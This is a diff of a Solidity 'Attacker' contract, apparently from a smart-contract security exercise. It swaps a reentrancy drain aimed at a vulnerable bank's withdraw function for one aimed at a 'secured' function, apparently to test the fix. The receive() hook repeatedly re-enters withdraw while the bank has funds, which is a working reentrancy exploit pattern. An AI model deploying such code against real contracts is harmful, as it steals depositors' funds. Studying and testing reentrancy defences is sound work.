@@ -1,41 +1,46 @@
 // SPDX-License-identifier: MIT
 pragma solidity ^0.8.30;
 
-import "src/SimpleBankVulnerable.sol";
+// Import the bank contract to interact with it
+import "./SimpleBankVulnerable.sol"; 
 
 contract Attacker {
-
     SimpleBankVulnerable public bank;
-
-    //Hold the amount to withdraw in reentrancy attack
-    uint256 public constant REETRANCY_WITHDRAW_AMOUNT = 1;
-
-    constructor(address _bankAddress) payable { 
-    bank = SimpleBankVulnerable(_bankAddress);
+    
+    // Amount to be withdrawn in each reentrancy call
+    uint256 public constant REENTRANCY_WITHDRAW_AMOUNT = 1 ether; // Use 1 ether for the attack
+    // Constructor must be payable to receive funds during deployment
+    constructor(address _bankAddress) payable {
+        bank = SimpleBankVulnerable(_bankAddress);
     }
 
-    // Start the reentrancy attack
-    function attack() external {
-        bank.withdrawVulnerable(REETRANCY_WITHDRAW_AMOUNT);
-    }
-
-    //Function is called when SimpleBankVulnerable sends ETH to this contract
-    receive() external payable {
-        //Check if the bank still has funds to withdraw
-        if (address(bank).balance >= REETRANCY_WITHDRAW_AMOUNT){
-            //Reenter the bank contract to withdraw again
-            bank.withdrawVulnerable(REETRANCY_WITHDRAW_AMOUNT);
-        }
-    }
-
-    // Helper function to deposit ETH into the bank
+    // Function to deposit funds into the bank
     function deposit() external payable {
-    bank.deposit{value: msg.value}(); 
+        bank.deposit{value: msg.value}();
+    }
+    
+    // Function to initiate the attack
+    function attackSecured() external {
+        // The Attacker calls the secured withdraw function for the first time
+        bank.withdrawSecured(REENTRANCY_WITHDRAW_AMOUNT); 
     }
 
-    // Helper function to get the balance of this contract
-    function getBalance() external view returns (uint256) {
-    return address(this).balance;
+    // THE REENTRANCY HOOK
+    // This function is triggered when SimpleBankVulnerable attempts to send ETH back.
+   receive() external payable {
+        // Check if the bank still has enough balance to continue the attack
+    if (address(bank).balance >= REENTRANCY_WITHDRAW_AMOUNT) { 
+       // Re-enter the withdraw function
+        (bool success, ) = address(bank).call(
+            abi.encodeWithSignature("withdrawSecured(uint256)", REENTRANCY_WITHDRAW_AMOUNT)
+        );
+        // Ensure the call was successful
+        require(success, "Reentrant call failed");
+    }
 }
 
+    // Function to check the Attacker contract's final balance
+    function checkBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
 }
